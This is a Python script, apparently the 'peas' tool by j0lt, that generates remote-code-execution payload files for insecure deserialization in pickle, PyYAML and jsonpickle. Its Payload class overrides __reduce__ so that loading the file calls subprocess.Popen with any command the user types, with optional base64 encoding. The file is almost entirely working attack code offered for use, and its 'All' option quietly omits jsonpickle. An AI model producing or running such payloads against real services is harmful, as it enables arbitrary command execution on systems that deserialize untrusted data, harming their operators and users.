# Python Deserialization attack payload file generator for pickle ,pyYAML and jsonpickle module by j0lt
# Requirements : Python 3 , module jsonpickle
# Usage : python peas.py

import pickle
import base64
import jsonpickle
import yaml
import subprocess

class Payload(object):

    def __init__(self, cmd ,  location, base):
        self.cmd = cmd
        self.location = location
        self.base = base

    def pick(self):
        by = pickle.dumps(Payload(tuple(self.cmd.split(" ")), self.location, self.base))
        by = self.verifyencoding(by)
        open(self.location.__add__("_pick"), "wb").write(by)

    def ya(self):
        by = bytes(yaml.dump(Payload(tuple(self.cmd.split(" ")), self.location, self.base)), 'utf-8')
        by = self.verifyencoding(by)
        open(self.location.__add__("_yaml"), "wb").write(by)

    def js(self):
        by = bytes(jsonpickle.encode(Payload(tuple(self.cmd.split(" ")), self.location, self.base)), 'utf-8')
        by = self.verifyencoding(by)
        open(self.location.__add__("_jspick"), "wb").write(by)

    def __add__(self, other):

        return self+other
    
    def __reduce__(self):
        return subprocess.Popen, (self.cmd,)

    def verifyencoding(self, s):
        if self.base :
            return base64.b64encode(s)
        else:
            return s


if __name__ == "__main__":
    cmd = input("Enter RCE command :")
    b = True if input("Want to base64 encode payload ? (N/y) :").lower() == "y" else False
    location = input("Enter File location and name to save :")
    p = Payload(cmd, location, b)
    while 1:
        module = input("Select Module (Pickle, PyYAML, jsonpickle, All) :").lower()


        if module == "pickle":
            p.pick()
            break
        elif module == "pyyaml":
            p.ya()
            break
        elif module == "jsonpickle":
            p.js()
            break
        elif module == "all":
            p.pick()
            p.ya()
            break

        else:
            print("Wrong Input ")
            continue

    print("done")
